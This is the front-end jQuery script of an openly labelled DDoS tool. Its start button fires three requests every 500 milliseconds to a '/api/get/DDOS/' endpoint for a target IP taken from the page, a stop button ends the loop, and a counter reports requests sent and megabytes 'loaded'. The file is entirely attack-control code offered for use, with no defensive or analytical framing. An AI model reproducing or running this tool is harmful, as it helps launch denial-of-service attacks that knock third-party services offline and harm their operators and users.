$(document).ready(function(){

  function do_ddos(url){
    $.when(
        $.ajax({
            url: '/api/get/DDOS/'+url,
            type: 'GET',
            cache: false,
            success: function(data){
              one = 'done';
            }
        }),

        $.ajax({
            url: '/api/get/DDOS/'+url,
            type: 'GET',
            cache: false,
            success: function(data){
              two = 'done';
            }
        }),

        $.ajax({
            url: '/api/get/DDOS/'+url,
            type: 'GET',
            cache: false,
            success: function(data){
              three = 'done';
            }
        })

    ).then(function() {
      num = parseInt($('#jquery-replace').html());

      if (one == 'done') num++;
      if (two == 'done') num++;
      if (three == 'done') num++;

      data_load = num * 127;


      $('#jquery-replace').html(num+' requests sent <br/> mb: '+data_load+'MB LOADED');
    });
  }



  // Start-attack management.
  $('#start').click(function(){
    ddos_loop = setInterval(function(){
      do_ddos($('#ip').html());
    }, 500);
  });
  // Stop-attack management.
  $('#stop').click(function(){
    clearInterval(ddos_loop);
  })
});
